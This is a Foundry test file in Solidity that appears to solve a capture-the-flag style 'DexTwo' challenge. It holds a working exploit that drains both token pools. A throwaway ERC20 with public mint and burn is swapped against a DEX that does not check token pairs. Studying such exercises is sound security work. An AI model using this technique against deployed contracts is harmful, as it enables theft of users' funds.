pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import "../src/DexTwo.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract AttackerToken is ERC20 {
    constructor() ERC20("AttackerToken", "AT") {}

    function mint(address a, uint256 amount) public {
        _mint(a, amount);
    }

    function burn(address a, uint256 amount) public {
        _burn(a, amount);
    }
}

contract DexTwoTest is Test {
    DexTwo public dextwo;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;

    function setUp() public {
        dextwo = new DexTwo();
        token1 = new SwappableTokenTwo(address(dextwo), "token1", "t1", 100 ether);
        token1.transfer(address(dextwo), 100 ether);
        token2 = new SwappableTokenTwo(address(dextwo), "token2", "t2", 100 ether);
        token2.transfer(address(dextwo), 100 ether);
    }

    function testAttack() public {
        uint256 myInitialBalance1 = token1.balanceOf(address(this));
        uint256 myInitialBalance2 = token2.balanceOf(address(this));

        AttackerToken attackerToken = new AttackerToken();
        attackerToken.mint(address(dextwo), 1);
        attackerToken.mint(address(this), 2);
        attackerToken.approve(address(dextwo), 2);
        dextwo.swap(address(attackerToken), address(token1), 1);
        attackerToken.burn(address(dextwo), 1);
        dextwo.swap(address(attackerToken), address(token2), 1);

        assertEq(token1.balanceOf(address(dextwo)), 0);
        assertEq(token2.balanceOf(address(dextwo)), 0);
        assertEq(token1.balanceOf(address(this)), myInitialBalance1 + 100 ether);
        assertEq(token2.balanceOf(address(this)), myInitialBalance2 + 100 ether);
    }
}